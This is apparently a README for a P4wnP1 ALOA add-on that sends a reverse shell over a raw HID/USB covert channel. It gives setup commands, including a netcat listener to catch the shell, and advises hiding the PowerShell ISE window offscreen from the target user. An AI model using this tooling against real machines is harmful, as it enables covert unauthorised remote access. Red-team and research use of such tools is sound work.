# Intro  
This is an alternative to the built-in covert channel option for the P4wnP1 aloa (https://github.com/RoganDawes/P4wnP1_aloa)  
that goes over a raw HID and USB rather than WiFi.  

# How to use  
## Copy the server folder onto the P4wnP1 (ssh, scp, git, wget whatever)  
```
git clone https://github.com/LuemmelSec/CovertChannel
```

## Run the server  
```
go run server.go
```
![image](https://github.com/user-attachments/assets/3d789442-a3c4-4326-825b-7d8a657edcd0)

## Setup a listener to catch the reverseshell on the P4wnP1
```
nc -lvnp 4444
```
![image](https://github.com/user-attachments/assets/e2cd715a-5fda-4765-9e83-e854ab1eccaf)

## Execute the script
Copy the content of the ``helper.js`` into the ``HIDSCRIPT```section of your P4wnP1  
![image](https://github.com/user-attachments/assets/f08e6738-11c9-4de0-b6dc-f970aab16b91)

Adjust all the settings to your needs. The way it defaults to is movin the ISE out of view with X -2000 and Y -2000  
Change the keyboard layout !!!  

Last but not least: Run the payload and catch the shell.
